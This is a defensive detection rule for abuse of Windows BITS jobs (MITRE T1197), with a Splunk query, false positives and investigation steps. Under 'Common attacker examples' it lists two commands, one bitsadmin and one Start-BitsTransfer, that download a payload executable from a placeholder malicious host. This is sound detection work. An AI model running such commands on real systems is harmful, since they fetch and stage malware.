# BITS Job Persistence Detection

## Overview

Detects suspicious use of Windows Background Intelligent Transfer Service (BITS) jobs that may indicate ransomware-related persistence, payload download, or defense evasion.

## MITRE ATT&CK

* Technique ID: T1197
* Technique Name: BITS Jobs
* Tactic: Persistence, Defense Evasion

## Detection Logic

Monitor for:

* Execution of `bitsadmin.exe`
* Usage of `Start-BitsTransfer` in PowerShell
* Creation of new BITS jobs downloading executables or scripts
* BITS jobs downloading from suspicious or unknown domains

Common attacker examples:

* `bitsadmin /transfer job https://malicious.site/payload.exe C:\Temp\payload.exe`
* `Start-BitsTransfer -Source http://malicious.site/payload.exe -Destination C:\Users\Public\payload.exe`

## Splunk SPL Query

```spl
index=windows (Image="*bitsadmin.exe" OR CommandLine="*Start-BitsTransfer*")
| stats count by _time, host, user, Image, CommandLine, ParentImage
| sort - _time
```

## Potential False Positives

* Windows Update
* Microsoft Office updates
* Legitimate administrative file transfers
* Enterprise software deployment tools

## Investigation Steps

1. Identify the user who created the BITS job.
2. Review the source and destination of transferred files.
3. Verify whether the download source is trusted.
4. Analyze downloaded files for malicious activity.
5. Investigate related persistence or lateral movement activity.

## Severity

High

## References

* https://attack.mitre.org/techniques/T1197/
* https://learn.microsoft.com/windows/win32/bits/background-intelligent-transfer-service-portal
